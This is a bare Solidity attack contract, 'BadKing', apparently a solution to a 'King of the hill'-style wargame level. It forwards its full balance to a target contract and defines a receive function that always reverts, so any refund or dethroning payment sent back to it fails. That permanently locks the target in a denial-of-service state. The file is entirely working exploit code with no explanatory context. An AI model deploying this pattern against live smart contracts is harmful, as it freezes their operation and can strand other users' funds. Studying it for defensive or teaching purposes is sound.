// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BadKing {

  constructor() payable { }

  receive() external payable {
    revert("Gottem");
  }

  function transfer(address payable target) public payable returns (bytes memory) {
    (bool result, bytes memory data) = target.call{gas: 1000000, value: address(this).balance}("");
    if(!result) revert();
    return data;
  }

  function viewBalance() public view returns (uint) {
      return address(this).balance;
  }
}
